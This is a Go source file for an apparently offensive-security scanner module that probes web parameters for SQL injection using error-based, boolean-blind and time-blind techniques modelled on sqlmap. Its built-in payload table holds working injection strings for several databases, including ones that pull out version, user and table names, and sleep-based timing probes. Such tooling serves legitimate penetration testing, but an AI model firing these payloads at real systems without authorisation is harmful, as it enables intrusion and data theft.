// Package sqli implements SQL Injection detection via three complementary techniques.
//
// Source reference: sqlmap (GPL-2.0) detection logic — techniques are publicly
// documented algorithms, reimplemented from scratch without copying code.
//
// Reference: sqlmap/lib/techniques/ — error-based, boolean-based, time-based detection.
//
// Techniques implemented (mirrors sqlmap --technique flag):
//   - E  Error-based:  inject payloads that trigger DB-specific error messages
//   - B  Boolean-based blind:  compare responses for true/false conditions
//   - T  Time-based blind:  measure response delay for sleep/benchmark payloads
//
// Architecture:
//   - Payload struct: technique + dbms family + inject string + detection func
//   - errgroup.SetLimit(Parallelism) fan-out (guia-go §9)
//   - io.LimitReader on every response body (dicas.md §5)
//   - log/slog observability (dicas.md §16)
//   - sync.Mutex protecting findings slice
//   - NewWithClient(*http.Client) + overridable timeouts for testability
//   - Soft failure per payload: log DEBUG, continue
//
// What is ported faithfully:
//   - Error-based payloads: MySQL, PostgreSQL, MSSQL, Oracle, SQLite, IBM DB2
//     error string signatures from sqlmap/data/xml/errors.xml
//   - Boolean-based: true/false condition pairs, response body length comparison
//   - Time-based: sleep payloads, response time delta > threshold
//   - GET parameter injection (append payload) + POST body injection
package sqli

import (
	"context"
	"fmt"
	"io"
	"log/slog"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"

	"github.com/DonatoReis/blackhorn-modules/pkg/httpclient"
	"github.com/DonatoReis/blackhorn-modules/pkg/module"
	"golang.org/x/sync/errgroup"
)

// ─── Constants ───────────────────────────────────────────────────────────────

const (
	// DefaultTimeout is the per-request timeout for regular probes.
	DefaultTimeout = 10 * time.Second

	// DefaultTimeBasedTimeout is per-request timeout for time-based probes
	// (must accommodate the sleep delay).
	DefaultTimeBasedTimeout = 30 * time.Second

	// DefaultTimeSleepSeconds is the sleep delay injected into time-based payloads.
	DefaultTimeSleepSeconds = 5

	// DefaultParallelism is the maximum concurrent injection probes.
	DefaultParallelism = 10

	// maxBodyRead is the maximum response body bytes read per request.
	maxBodyRead = 512 * 1024 // 512 KB

	// timeDeltaFactor: response is considered "delayed" if elapsed > sleep * factor.
	timeDeltaFactor = 0.8
)

// ─── Technique flags (mirrors sqlmap --technique) ────────────────────────────

const (
	TechniqueError   = "E"
	TechniqueBoolean = "B"
	TechniqueTime    = "T"
)

// ─── Payload ─────────────────────────────────────────────────────────────────

// Payload defines a single SQL injection test payload.
// Mirrors sqlmap/lib/core/data.py PayloadData structure.
type Payload struct {
	// Technique is one of E (error-based), B (boolean-based), T (time-based).
	Technique string
	// DBMS is the targeted database family (mysql, postgresql, mssql, oracle, sqlite, generic).
	DBMS string
	// Inject is the string appended to the parameter value.
	Inject string
	// TrueInject / FalseInject are used for boolean-based: two variants that should
	// return different responses. TrueInject should return the real page; FalseInject
	// a different/empty one.
	TrueInject  string
	FalseInject string
	// SleepSeconds is the sleep delay for time-based payloads (0 = use DefaultTimeSleepSeconds).
	SleepSeconds int
	// Detect is a function that inspects the response body/status and returns true
	// if the payload triggered the expected indicator.
	// For boolean/time techniques this is set automatically — only error-based uses custom.
	Detect func(body string, status int) bool
	// Severity is the finding severity when this payload matches.
	Severity module.Severity
	// Tags are metadata tags.
	Tags []string
}

// ─── Module ──────────────────────────────────────────────────────────────────

// Module implements SQL Injection detection.
type Module struct {
	client          *http.Client
	timeBasedClient *http.Client
	payloads        []Payload
	parallelism     int
	sleepSeconds    int
	techniques      map[string]bool // enabled techniques
	logger          *slog.Logger
}

// New returns a Module with all built-in payloads and default HTTP client.
func New() *Module {
	c := httpclient.New(httpclient.Options{Timeout: DefaultTimeout})
	tb := httpclient.New(httpclient.Options{Timeout: DefaultTimeBasedTimeout})
	return &Module{
		client:          c,
		timeBasedClient: tb,
		payloads:        builtinPayloads(),
		parallelism:     DefaultParallelism,
		sleepSeconds:    DefaultTimeSleepSeconds,
		techniques:      map[string]bool{TechniqueError: true, TechniqueBoolean: true, TechniqueTime: true},
		logger:          slog.Default(),
	}
}

// NewWithClient returns a Module using the supplied HTTP client (testability).
func NewWithClient(c *http.Client) *Module {
	m := New()
	m.client = c
	m.timeBasedClient = c
	return m
}

// Name returns the module name.
func (m *Module) Name() string { return "sqli" }

// Run executes SQL injection probes against all target URLs and their parameters.
//
// Options supported:
//   - "techniques"    — comma-separated techniques to enable: E,B,T (default: all)
//   - "parallelism"   — max concurrent probes (default: 10)
//   - "sleep_seconds" — sleep delay for time-based payloads (default: 5)
//   - "dbms"          — comma-separated DBMS families to limit testing (e.g. "mysql,postgresql")
//   - "method"        — HTTP method to inject: GET or POST (default: GET)
func (m *Module) Run(ctx context.Context, input module.Input) ([]module.Finding, error) {
	targets := collectTargets(input)
	if len(targets) == 0 {
		return nil, nil
	}

	// Apply options.
	parallelism := m.parallelism
	if v := input.Options["parallelism"]; v != "" {
		if p, err := parseInt(v); err == nil && p > 0 {
			parallelism = p
		}
	}

	sleepSecs := m.sleepSeconds
	if v := input.Options["sleep_seconds"]; v != "" {
		if s, err := parseInt(v); err == nil && s > 0 {
			sleepSecs = s
		}
	}

	techniques := m.techniques
	if v := input.Options["techniques"]; v != "" {
		techniques = parseTechniques(v)
	}

	dbmsFilter := parseCSV(input.Options["dbms"])
	method := strings.ToUpper(input.Options["method"])
	if method == "" {
		method = "GET"
	}

	// Select payloads based on techniques and DBMS filter.
	payloads := m.selectPayloads(techniques, dbmsFilter, sleepSecs)

	var (
		mu       sync.Mutex
		seen     = make(map[string]struct{})
		findings []module.Finding
	)

	addFinding := func(f module.Finding) {
		key := f.Type + "|" + f.URL + "|" + f.Extra["param"] + "|" + f.Extra["technique"]
		mu.Lock()
		defer mu.Unlock()
		if _, ok := seen[key]; !ok {
			seen[key] = struct{}{}
			findings = append(findings, f)
		}
	}

	eg, egCtx := errgroup.WithContext(ctx)
	eg.SetLimit(parallelism)

	for _, target := range targets {
		target := target
		params := extractParams(target, method, input)
		if len(params) == 0 {
			m.logger.DebugContext(ctx, "sqli: no parameters found", "url", target)
			continue
		}

		for _, param := range params {
			param := param
			for _, payload := range payloads {
				payload := payload
				eg.Go(func() error {
					f, ok := m.probe(egCtx, target, param, payload, method, sleepSecs)
					if ok {
						addFinding(f)
					}
					return nil
				})
			}
		}
	}

	_ = eg.Wait()
	return findings, nil
}

// probe sends a single injection probe and returns a finding if matched.
func (m *Module) probe(ctx context.Context, rawURL, param string, payload Payload, method string, sleepSecs int) (module.Finding, bool) {
	switch payload.Technique {
	case TechniqueError:
		return m.probeError(ctx, rawURL, param, payload, method)
	case TechniqueBoolean:
		return m.probeBoolean(ctx, rawURL, param, payload, method)
	case TechniqueTime:
		return m.probeTime(ctx, rawURL, param, payload, method, sleepSecs)
	}
	return module.Finding{}, false
}

// probeError sends the error-based payload and inspects for DB error strings.
func (m *Module) probeError(ctx context.Context, rawURL, param string, payload Payload, method string) (module.Finding, bool) {
	injected := injectParam(rawURL, param, payload.Inject, method)
	body, status, _, err := m.doRequest(ctx, injected, method, m.client)
	if err != nil {
		m.logger.DebugContext(ctx, "sqli error probe failed", "url", rawURL, "param", param, "err", err)
		return module.Finding{}, false
	}

	if payload.Detect != nil && payload.Detect(body, status) {
		return m.building(rawURL, param, payload, injected, "error-based DB error in response"), true
	}
	return module.Finding{}, false
}

// probeBoolean sends true/false condition payloads and compares response lengths.
func (m *Module) probeBoolean(ctx context.Context, rawURL, param string, payload Payload, method string) (module.Finding, bool) {
	trueURL := injectParam(rawURL, param, payload.TrueInject, method)
	falseURL := injectParam(rawURL, param, payload.FalseInject, method)

	trueBody, trueStatus, trueLen, err := m.doRequest(ctx, trueURL, method, m.client)
	if err != nil {
		return module.Finding{}, false
	}
	falseBody, falseStatus, falseLen, err := m.doRequest(ctx, falseURL, method, m.client)
	if err != nil {
		return module.Finding{}, false
	}

	// Both must return 200 (or same code) — a 500 on false may indicate error-based.
	if trueStatus != 200 || falseStatus != 200 {
		return module.Finding{}, false
	}

	// Significant length difference indicates boolean-based blind SQLi.
	// Threshold: >20% length difference (mirrors sqlmap's ratio check).
	diff := abs(trueLen - falseLen)
	minLen := trueLen
	if falseLen < minLen {
		minLen = falseLen
	}
	if minLen == 0 || diff == 0 {
		return module.Finding{}, false
	}

	ratio := float64(diff) / float64(minLen)
	if ratio < 0.20 {
		return module.Finding{}, false
	}

	// Additional check: true response should not be identical to false.
	if trueBody == falseBody {
		return module.Finding{}, false
	}

	detail := fmt.Sprintf("boolean-based blind: true=%d bytes false=%d bytes diff=%.0f%%",
		trueLen, falseLen, ratio*100)
	return m.building(rawURL, param, payload, trueURL, detail), true
}

// probeTime sends a sleep payload and measures response delay.
func (m *Module) probeTime(ctx context.Context, rawURL, param string, payload Payload, method string, sleepSecs int) (module.Finding, bool) {
	sleep := payload.SleepSeconds
	if sleep <= 0 {
		sleep = sleepSecs
	}

	// Build the actual inject string with the sleep value substituted.
	inject := strings.ReplaceAll(payload.Inject, "{SLEEP}", fmt.Sprintf("%d", sleep))
	injected := injectParam(rawURL, param, inject, method)

	// Use baseline to account for server latency: first measure clean request.
	baseURL := injectParam(rawURL, param, "1", method)
	_, _, _, err := m.doRequest(ctx, baseURL, method, m.client)
	if err != nil {
		return module.Finding{}, false
	}

	start := time.Now()
	_, _, _, err = m.doRequest(ctx, injected, method, m.timeBasedClient)
	elapsed := time.Since(start)

	if err != nil {
		// Timeout itself can be a positive signal for time-based.
		if strings.Contains(err.Error(), "deadline") || strings.Contains(err.Error(), "timeout") {
			detail := fmt.Sprintf("time-based blind: request timed out (sleep=%ds)", sleep)
			return m.building(rawURL, param, payload, injected, detail), true
		}
		return module.Finding{}, false
	}

	threshold := time.Duration(float64(sleep) * timeDeltaFactor * float64(time.Second))
	if elapsed < threshold {
		return module.Finding{}, false
	}

	detail := fmt.Sprintf("time-based blind: elapsed=%s threshold=%s sleep=%ds",
		elapsed.Round(time.Millisecond), threshold.Round(time.Millisecond), sleep)
	return m.building(rawURL, param, payload, injected, detail), true
}

// building constructs a Finding from a successful probe.
func (m *Module) building(rawURL, param string, payload Payload, injectedURL, detail string) module.Finding {
	m.logger.InfoContext(context.Background(), "sqli: vulnerability found",
		"url", rawURL, "param", param, "technique", payload.Technique, "dbms", payload.DBMS)

	return module.Finding{
		Type:     "sqli",
		Severity: payload.Severity,
		URL:      rawURL,
		Detail:   fmt.Sprintf("[SQLi/%s/%s] param=%q: %s", payload.Technique, payload.DBMS, param, detail),
		Extra: map[string]string{
			"param":      param,
			"technique":  payload.Technique,
			"dbms":       payload.DBMS,
			"injected":   injectedURL,
			"tags":       strings.Join(payload.Tags, ","),
			"severity":   string(payload.Severity),
			"confidence": sqliConfidence(payload.Technique),
		},
	}
}

// sqliConfidence returns confidence per technique per dicas.md §4.
// Error-based: DB error message is unambiguous → 0.95.
// Boolean-based: body-length differential — some false-positives possible → 0.82.
// Time-based: timing delta is probabilistic → 0.75.
func sqliConfidence(technique string) string {
	switch technique {
	case "E":
		return "0.95"
	case "B":
		return "0.82"
	case "T":
		return "0.75"
	default:
		return "0.85"
	}
}

// doRequest performs an HTTP GET or POST and returns body, status, bodyLen, error.
func (m *Module) doRequest(ctx context.Context, rawURL, method string, c *http.Client) (string, int, int, error) {
	var req *http.Request
	var err error

	if method == "POST" {
		parsed, parseErr := url.Parse(rawURL)
		if parseErr != nil {
			return "", 0, 0, parseErr
		}
		body := parsed.RawQuery
		parsed.RawQuery = ""
		req, err = http.NewRequestWithContext(ctx, "POST", parsed.String(),
			strings.NewReader(body))
		if err != nil {
			return "", 0, 0, err
		}
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	} else {
		req, err = http.NewRequestWithContext(ctx, "GET", rawURL, nil)
		if err != nil {
			return "", 0, 0, err
		}
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (compatible; blackhorn-sqli/1.0)")

	resp, err := c.Do(req)
	if err != nil {
		return "", 0, 0, err
	}
	defer resp.Body.Close()

	b, _ := io.ReadAll(io.LimitReader(resp.Body, maxBodyRead))
	return string(b), resp.StatusCode, len(b), nil
}

// ─── Parameter extraction ─────────────────────────────────────────────────────

// Param represents an injectable parameter.
type Param struct {
	Name  string
	Value string
}

// extractParams returns all query/body parameters from a URL.
func extractParams(rawURL, method string, input module.Input) []string {
	parsed, err := url.Parse(rawURL)
	if err != nil {
		return nil
	}
	var params []string
	for k := range parsed.Query() {
		params = append(params, k)
	}
	// Also include any FUZZ-marked parameters from RawContent.
	if input.RawContent != "" {
		for _, line := range strings.Split(input.RawContent, "\n") {
			if idx := strings.Index(line, "="); idx > 0 {
				k := strings.TrimSpace(line[:idx])
				if k != "" {
					params = append(params, k)
				}
			}
		}
	}
	return dedup(params)
}

// injectParam returns a URL with the given parameter's value replaced by inject.
func injectParam(rawURL, param, inject string, method string) string {
	parsed, err := url.Parse(rawURL)
	if err != nil {
		return rawURL + inject
	}
	q := parsed.Query()
	if _, ok := q[param]; !ok {
		// Parameter not present — append it.
		q.Set(param, inject)
	} else {
		q.Set(param, q.Get(param)+inject)
	}
	parsed.RawQuery = q.Encode()
	return parsed.String()
}

// ─── Helper functions ─────────────────────────────────────────────────────────

func collectTargets(input module.Input) []string {
	seen := make(map[string]struct{})
	var out []string
	add := func(u string) {
		u = strings.TrimSpace(u)
		if u == "" {
			return
		}
		if _, ok := seen[u]; !ok {
			seen[u] = struct{}{}
			out = append(out, u)
		}
	}
	if input.Target != "" {
		add(input.Target)
	}
	for _, u := range input.URLs {
		add(u)
	}
	return out
}

func parseTechniques(s string) map[string]bool {
	m := make(map[string]bool)
	for _, t := range strings.Split(strings.ToUpper(s), ",") {
		t = strings.TrimSpace(t)
		if t != "" {
			m[t] = true
		}
	}
	return m
}

func parseCSV(s string) []string {
	if s == "" {
		return nil
	}
	var out []string
	for _, p := range strings.Split(s, ",") {
		p = strings.TrimSpace(p)
		if p != "" {
			out = append(out, strings.ToLower(p))
		}
	}
	return out
}

func parseInt(s string) (int, error) {
	var n int
	_, err := fmt.Sscanf(strings.TrimSpace(s), "%d", &n)
	return n, err
}

func abs(x int) int {
	if x < 0 {
		return -x
	}
	return x
}

func dedup(in []string) []string {
	seen := make(map[string]struct{})
	var out []string
	for _, s := range in {
		if _, ok := seen[s]; !ok {
			seen[s] = struct{}{}
			out = append(out, s)
		}
	}
	return out
}

// selectPayloads returns payloads filtered by enabled techniques and DBMS.
func (m *Module) selectPayloads(techniques map[string]bool, dbmsFilter []string, sleepSecs int) []Payload {
	dbmsSet := make(map[string]struct{})
	for _, d := range dbmsFilter {
		dbmsSet[d] = struct{}{}
	}

	var out []Payload
	for _, p := range m.payloads {
		if !techniques[p.Technique] {
			continue
		}
		if len(dbmsSet) > 0 {
			if _, ok := dbmsSet[p.DBMS]; !ok {
				if p.DBMS != "generic" {
					continue
				}
			}
		}
		out = append(out, p)
	}
	return out
}

// ─── Built-in payloads ────────────────────────────────────────────────────────

// builtinPayloads returns the default set of SQL injection payloads.
// Error signatures are sourced from sqlmap/data/xml/errors.xml (GPL-2.0, public data).
// The injection logic and payload strings are standard SQLi techniques, not copied code.
func builtinPayloads() []Payload {
	// ── Error-based payload builder ────────────────────────────────────────
	errPayload := func(inject, dbms string, sev module.Severity, errorPatterns []string) Payload {
		patterns := errorPatterns
		return Payload{
			Technique: TechniqueError,
			DBMS:      dbms,
			Inject:    inject,
			Severity:  sev,
			Tags:      []string{"sqli", "error-based", dbms},
			Detect: func(body string, status int) bool {
				b := strings.ToLower(body)
				for _, p := range patterns {
					if strings.Contains(b, strings.ToLower(p)) {
						return true
					}
				}
				return false
			},
		}
	}

	// ── Boolean-based payload builder ──────────────────────────────────────
	boolPayload := func(trueInject, falseInject, dbms string) Payload {
		return Payload{
			Technique:   TechniqueBoolean,
			DBMS:        dbms,
			TrueInject:  trueInject,
			FalseInject: falseInject,
			Severity:    module.SeverityHigh,
			Tags:        []string{"sqli", "boolean-based", dbms},
		}
	}

	// ── Time-based payload builder ─────────────────────────────────────────
	timePayload := func(inject, dbms string) Payload {
		return Payload{
			Technique: TechniqueTime,
			DBMS:      dbms,
			Inject:    inject, // must contain {SLEEP} placeholder
			Severity:  module.SeverityHigh,
			Tags:      []string{"sqli", "time-based", dbms},
		}
	}

	return []Payload{

		// ══════════════════════════════════════════════════════════════
		// ERROR-BASED PAYLOADS
		// Signatures from sqlmap/data/xml/errors.xml (public data)
		// ══════════════════════════════════════════════════════════════

		// ── MySQL ──────────────────────────────────────────────────────
		errPayload(`'`, "mysql", module.SeverityHigh, []string{
			"you have an error in your sql syntax",
			"warning: mysql",
			"mysql_fetch_array()",
			"mysql_num_rows()",
			"supplied argument is not a valid mysql",
			"mysql error",
			"com.mysql.jdbc",
			"org.gjt.mm.mysql",
		}),
		errPayload(`' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--`, "mysql", module.SeverityCritical, []string{
			"extractvalue(",
			"xpath syntax error",
			"0x7e",
		}),
		errPayload(`' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--`, "mysql", module.SeverityCritical, []string{
			"duplicate entry",
			"for key",
			"group_key",
		}),

		// ── PostgreSQL ────────────────────────────────────────────────
		errPayload(`'`, "postgresql", module.SeverityHigh, []string{
			"pg_query()",
			"pg_exec()",
			"postgresql query failed",
			"supplied argument is not a valid postgresql",
			"pgsql_query",
			"psql_query",
			"unterminated quoted string",
			"pg::syntaxerror",
			"syntax error at or near",
			"error: operator does not exist",
			"psycopg2.errors",
			"sqlstate[42601]",
		}),
		errPayload(`' AND 1=CAST((SELECT version())::text AS int)--`, "postgresql", module.SeverityCritical, []string{
			"invalid input syntax for type integer",
			"postgresql",
		}),

		// ── Microsoft SQL Server ──────────────────────────────────────
		errPayload(`'`, "mssql", module.SeverityHigh, []string{
			"unclosed quotation mark after the character string",
			"incorrect syntax near",
			"sqlserver",
			"sql server",
			"microsoft sql native client",
			"odbc sql server driver",
			"[microsoft][odbc sql server driver]",
			"microsoft ole db provider for sql server",
			"mssql_query()",
			"mssql_num_rows()",
			"sqlsrv_query()",
		}),
		errPayload(`' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects WHERE xtype='U'))--`, "mssql", module.SeverityCritical, []string{
			"conversion failed when converting",
			"varchar value",
			"sysobjects",
		}),

		// ── Oracle ───────────────────────────────────────────────────
		errPayload(`'`, "oracle", module.SeverityHigh, []string{
			"ora-00933: sql command not properly ended",
			"ora-00907: missing right parenthesis",
			"ora-00911: invalid character",
			"ora-00936: missing expression",
			"ora-01756: quoted string not properly terminated",
			"ora-01789: query block has incorrect number",
			"ora-00942: table or view does not exist",
			"ora-06512",
			"pl/sql:",
		}),
		errPayload(`' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual))--`, "oracle", module.SeverityCritical, []string{
			"ora-",
			"utl_inaddr",
		}),

		// ── SQLite ────────────────────────────────────────────────────
		errPayload(`'`, "sqlite", module.SeverityHigh, []string{
			"sqlite_query()",
			"sqlite_array_query()",
			"sqlite error",
			"near \"'\": syntax error",
			"sqlite3.operationalerror",
			"unable to open database file",
			"sqlite_step()",
		}),

		// ── IBM DB2 ───────────────────────────────────────────────────
		errPayload(`'`, "db2", module.SeverityHigh, []string{
			"db2 sql error",
			"sqlstate=",
			"com.ibm.db2",
			"cli driver",
			"db2/nt",
		}),

		// ── Generic (any DBMS) ────────────────────────────────────────
		errPayload(`'`, "generic", module.SeverityMedium, []string{
			"sql syntax",
			"sql error",
			"syntax error",
			"unexpected end of sql",
			"quoted string not properly terminated",
			"invalid query",
			"database error",
			"query failed",
			"warning: pg_",
			"warning: mysql_",
		}),

		// UNION-based probe (generic — works across DBMS)
		errPayload(`' UNION SELECT NULL--`, "generic", module.SeverityHigh, []string{
			"the used select statements have a different number of columns",
			"each union query must have the same number of columns",
			"all queries combined using a union, intersect or except operator",
			"union query must have the same number of columns",
		}),

		// ══════════════════════════════════════════════════════════════
		// BOOLEAN-BASED PAYLOADS (true vs false condition pairs)
		// ══════════════════════════════════════════════════════════════

		// Generic AND 1=1 / AND 1=2 (simplest boolean blind)
		boolPayload(`' AND '1'='1`, `' AND '1'='2`, "generic"),
		boolPayload(` AND 1=1--`, ` AND 1=2--`, "generic"),
		boolPayload(`' AND 1=1--`, `' AND 1=2--`, "generic"),
		boolPayload(`") AND ("1"="1`, `") AND ("1"="2`, "generic"),
		boolPayload(`')) AND (('1'='1`, `')) AND (('1'='2`, "generic"),

		// MySQL boolean
		boolPayload(`' AND SUBSTRING(@@version,1,1)='5`, `' AND SUBSTRING(@@version,1,1)='X`, "mysql"),
		boolPayload(`' AND LENGTH(database())>0--`, `' AND LENGTH(database())>100--`, "mysql"),

		// PostgreSQL boolean
		boolPayload(`' AND 1=(SELECT 1 WHERE 1=1)--`, `' AND 1=(SELECT 1 WHERE 1=2)--`, "postgresql"),

		// MSSQL boolean
		boolPayload(`' AND LEN(@@SERVERNAME)>0--`, `' AND LEN(@@SERVERNAME)>999--`, "mssql"),

		// ══════════════════════════════════════════════════════════════
		// TIME-BASED PAYLOADS ({SLEEP} is replaced with actual seconds)
		// ══════════════════════════════════════════════════════════════

		// MySQL SLEEP
		timePayload(`'; SELECT SLEEP({SLEEP})--`, "mysql"),
		timePayload(`' AND SLEEP({SLEEP})--`, "mysql"),
		timePayload(`1; SELECT SLEEP({SLEEP})--`, "mysql"),
		timePayload(`' OR SLEEP({SLEEP})--`, "mysql"),

		// PostgreSQL pg_sleep
		timePayload(`'; SELECT pg_sleep({SLEEP})--`, "postgresql"),
		timePayload(`' AND 1=(SELECT 1 FROM pg_sleep({SLEEP}))--`, "postgresql"),

		// MSSQL WAITFOR DELAY
		timePayload(`'; WAITFOR DELAY '0:0:{SLEEP}'--`, "mssql"),
		timePayload(`' WAITFOR DELAY '0:0:{SLEEP}'--`, "mssql"),
		timePayload(`1; WAITFOR DELAY '0:0:{SLEEP}'--`, "mssql"),

		// Oracle DBMS_PIPE.RECEIVE_MESSAGE
		timePayload(`' AND 1=(DBMS_PIPE.RECEIVE_MESSAGE(CHR(65)||CHR(65)||CHR(65),{SLEEP})) AND '1'='1`, "oracle"),

		// SQLite randomblob (time-based via CPU busy)
		timePayload(`' AND {SLEEP}=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB({SLEEP}00000000/2))))--`, "sqlite"),

		// Generic BENCHMARK (MySQL-style)
		timePayload(`' AND BENCHMARK({SLEEP}000000,MD5(1))--`, "generic"),
	}
}
